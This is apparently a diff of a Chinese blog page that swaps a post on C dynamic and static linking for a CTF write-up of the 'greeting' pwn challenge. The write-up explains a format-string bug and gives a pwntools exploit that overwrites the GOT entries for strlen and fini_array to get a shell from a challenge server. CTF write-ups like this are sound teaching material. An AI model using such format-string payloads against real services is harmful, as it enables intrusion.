@@ -19,11 +19,15 @@
     <link rel="dns-prefetch" href="http://blog.bugzeng.com">
     <!--SEO-->
 
-<meta name="keywords" content="C,Summary">
+<meta name="keywords" content="CTF,WriteUp,pwn,adworld">
 
 
-<meta name="description" content="个人很看重编译和链接这层的东西，简单谈一谈C语言的动态链接和静态链接
-动态链接简介在做程序开发的时候，有许多简单的函数是很常用的，但是如果每个程序都把这些很常用的函数的实现包含在内的话，就会占用...">
+<meta name="description" content="这个题来自 攻防世界 的进阶区
+ps: 其实是来自于 mma CTF 2016 ，只是我个人是在攻防世界做到的，入门尚浅
+分析checksec 一下
+
+是 32 位的程序，再 IDA 静态分析
+...">
 
 
 <meta name="robots" content="all">
@@ -34,7 +38,7 @@
 
 <title>
     
-    C语言动态链接与静态链接 |
+    [pwn] greeting WriteUp |
     
     Guu&#39;s Blog
 </title>
@@ -140,16 +144,16 @@
                     <p id="process"></p>
 <article class="post">
     <div class="post-head">
-        <h1 id="C语言动态链接与静态链接">
+        <h1 id="[pwn] greeting WriteUp">
             
-            C语言动态链接与静态链接
+            [pwn] greeting WriteUp
             
         </h1>
         <div class="post-meta">
     
     <span class="categories-meta fa-wrap">
         <i class="fa fa-folder-open-o"></i>
-        <a class="category-link" href="/categories/C/">C</a>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
     </span>
     
     
@@ -157,7 +161,7 @@
         <i class="fa fa-tags"></i>
         <span class="tags-meta">
             
-            <a class="tag-link" href="/tags/C/">C</a> <a class="tag-link" href="/tags/Summary/">Summary</a>
+            <a class="tag-link" href="/tags/CTF/">CTF</a> <a class="tag-link" href="/tags/WriteUp/">WriteUp</a> <a class="tag-link" href="/tags/adworld/">adworld</a> <a class="tag-link" href="/tags/pwn/">pwn</a>
             
         </span>
     </span>
@@ -167,7 +171,7 @@
     <span class="fa-wrap">
         <i class="fa fa-clock-o"></i>
         <span class="date-meta">
-            2018/10/15</span>
+            2019/10/07</span>
     </span>
     
     <span class="fa-wrap">
@@ -179,36 +183,24 @@
 </div>
         
         
-        <p class="fa fa-exclamation-triangle warning">
-            本文于<strong>
-                357</strong>
-            天之前发表，文中内容可能已经过时。
-        </p>
-        
     </div>
     
     <div class="post-body post-content">
-        <p>个人很看重编译和链接这层的东西，简单谈一谈C语言的动态链接和静态链接</p>
-<h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>在做程序开发的时候，有许多简单的函数是很常用的，但是如果每个程序都把这些很常用的函数的实现包含在内的话，就会占用很多空间</p>
-<p>有一个很好的办法，把这些常用的函数实现提取成单独的文件（动态链接库），放在某个地方，一个程序需要使用某个函数的时候再去加载对应的库，这样就能节省很多空间</p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// main.c</span><br><span class="line">void hello();</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    hello();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// hello.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void hello()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello World from hello.c\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译测试一下<br><code>gcc main.c hello.c -o main &amp;&amp; ./main</code><br><img src="./../pics/11850278-e3e7e8477dccc727.png" alt="正常输出，没毛病"></p>
-<p>接下来将<code>hello.c</code>编译成动态链接库试一试<br><code>gcc hello.c -shared -o libhello.so</code><br><img src="./../pics/11850278-9787cdc61297192a.png" alt></p>
-<p>可以看到编译出了<code>libhello.so</code></p>
-<p>接下来编译<code>main.c</code>，并且制定使用<code>libhello</code>这个库，在当前目录查找库文件<br><code>gcc main.c -lhello -L. -o main</code><br><img src="./../pics/11850278-7576b1c2f84901e8.png" alt></p>
-<p>运行一下试试</p>
-<p><img src="./../pics/11850278-4cb2d8036b04454a.png" alt="没毛病"></p>
-<p>试试把<code>libhello.so</code>的名字改了，或者移动到其他地方，让<code>main</code>找不到动态库<br><img src="./../pics/11850278-d6947296942c5c24.png" alt="可以看到，程序的确找不到库了，不能正常输出"></p>
-<p>可以很明确的看出，程序是在运行时动态加载<code>libhello.so</code>库的，如果这个库被移动或者改名了，程序就不能正常运行</p>
-<p>用ldd命令看看动态库的依赖<br><code>ldd ./main</code><br><img src="./../pics/11850278-8d6fd46576008c86.png" alt="可以看到这个程序的几个动态依赖"></p>
-<h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>静态链接就是直接把所有运行时需要的库，全部包含进程序中，打包在一起，这样就不管外面的库怎么移动怎么改名怎么缺少，程序都可以运行</p>
-<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是之前的代码，将<code>hello.c</code>编译，但是不作链接<br><code>gcc -c hello.c -o hello.o &amp;&amp; ll</code><br><img src="./../pics/11850278-3a700992478f51b2.png" alt="生成的hello.o"></p>
-<p>再把<code>hello.o</code>打包成静态库文件<br><code>ar -r libhello.a hello.o &amp;&amp; ll</code><br><img src="./../pics/11850278-c222fafabc2e7b24.png" alt="生成的静态库文件"></p>
-<p>再来编译<code>main.c</code>并且把<code>libhello.a</code>静态链接进程序中<br><code>gcc main.c -lhello -L. -static -o main_static</code><br><img src="./../pics/11850278-8ea164963b49bdef.png" alt></p>
-<p>运行结果一切正常，并且跟静态库已经没有关系了，删掉静态库程序依然可以运行<br><img src="./../pics/11850278-63b2d9f30852fc42.png" alt="可以看出差别在哪"></p>
-<p>用<code>ldd</code>命令看看<br><code>ldd ./main_static</code><br><img src="./../pics/11850278-e79bedeb9b78513e.png" alt="哈，不是个动态可执行文件"></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>没有小结，自己看书去！</p>
+        <p>这个题来自 <a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a> 的进阶区</p>
+<p>ps: 其实是来自于 mma CTF 2016 ，只是我个人是在攻防世界做到的，入门尚浅</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>checksec 一下</p>
+<p><img src="../pics/20191007003.png" alt="checksec"></p>
+<p>是 32 位的程序，再 IDA 静态分析</p>
+<p><img src="../pics/20191007004.png" alt="main"></p>
+<p>可以看到，存在格式化字符串漏洞，再看看读取字符串的函数 <code>getnline</code></p>
+<p><img src="../pics/20191007005.png" alt="getnline"></p>
+<p>找到输入的字符串中第一个 ‘\n’ 并且讲其修改为 ‘\0’ 之后，调用 <code>strlen</code></p>
+<p>又发现居然存在 <code>system</code> 函数，并且程序没有开启 RELRO 保护，可以修改 GOT 表</p>
+<p>于是考虑把 GOT 表中 <code>strlen</code> 指向 <code>system</code> 函数，然后再想办法传入字符串 <code>&quot;/bin/sh&quot;</code></p>
+<p>因为 Linux 的程序的执行流程，是把 <code>main</code> 函数作为参数传给 <code>__libc_start_main</code> 的，并且在执行完 main 后其实还有其他工作，具体的可以参见下面这张图片</p>
+<p><img src="../pics/20191007006.png" alt="cool"></p>
+<p>在执行完 <code>main</code> 后还会调用 <code>finiarray</code> 和 <code>destructor</code> 等函数，所以考虑修改 GOT 表中 <code>finiarray</code> 项指回 <code>main</code> 函数，这样在第一次输入完字符串之后还会再调用一次 <code>main</code> 函数，就可以输入两次，第一次修改 GOT 表，第二次就传入字符串 <code>&quot;/bin/sh&quot;</code> 拿到 shell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"111.198.29.45"</span>, <span class="number">43938</span>)</span><br><span class="line"></span><br><span class="line">strlen_got = <span class="number">0x08049a54</span></span><br><span class="line">fini_got = <span class="number">0x08049934</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len("Nice to meet you, ") = 18</span></span><br><span class="line">payload = <span class="string">b"aa"</span> + p32(fini_got+<span class="number">2</span>) + p32(strlen_got+<span class="number">2</span>) <span class="comment"># 18 + 10 = 28</span></span><br><span class="line">payload += p32(strlen_got) + p32(fini_got)            <span class="comment"># 28 + 8 = 36</span></span><br><span class="line">payload += <span class="string">b"%2016c"</span>  <span class="comment"># 36 + 2016 = 2052  ==&gt; 0x0804</span></span><br><span class="line">payload += <span class="string">b"%12$hn"</span></span><br><span class="line">payload += <span class="string">b"%13$hn"</span></span><br><span class="line">payload += <span class="string">b"%31884c"</span> <span class="comment"># 2052 + 31884 = 33936 ==&gt; 0x8490  ==&gt; 0x08048490 ==&gt; system_plt</span></span><br><span class="line">payload += <span class="string">b"%14$hn"</span></span><br><span class="line">payload += <span class="string">b"%349c"</span>   <span class="comment"># 33936 + 349 = 34285 ==&gt; 0x85ed  ==&gt; 0x080485ed ==&gt; main_addr</span></span><br><span class="line">payload += <span class="string">b"%15$hn"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"name... "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.sendlineafter("name... ", b"/bin/sh")</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
     
@@ -227,17 +219,11 @@
 </article>
 <div class="article-nav prev-next-wrap clearfix">
     
-    <a href="/2018/24738.html" class="pre-post btn btn-default" title="C语言指针小记">
-        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
-        <span class="hidden-xs">
-            C语言指针小记</span>
-    </a>
     
-    
-    <a href="/2018/57868.html" class="next-post btn btn-default" title="为什么要在Linux上学习C语言">
+    <a href="/2019/10070.html" class="next-post btn btn-default" title="[pwn] spwn WriteUp">
         <span class="hidden-lg">下一篇</span>
         <span class="hidden-xs">
-            为什么要在Linux上学习C语言</span><i class="fa fa-angle-right fa-fw"></i>
+            [pwn] spwn WriteUp</span><i class="fa fa-angle-right fa-fw"></i>
     </a>
     
 </div>
@@ -256,7 +242,7 @@
             Table of Contents
         </h3>
         
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#动态链接"><span class="toc-text">动态链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例"><span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#静态链接"><span class="toc-text">静态链接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简介-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例-1"><span class="toc-text">示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
         
     </div>
 </aside>
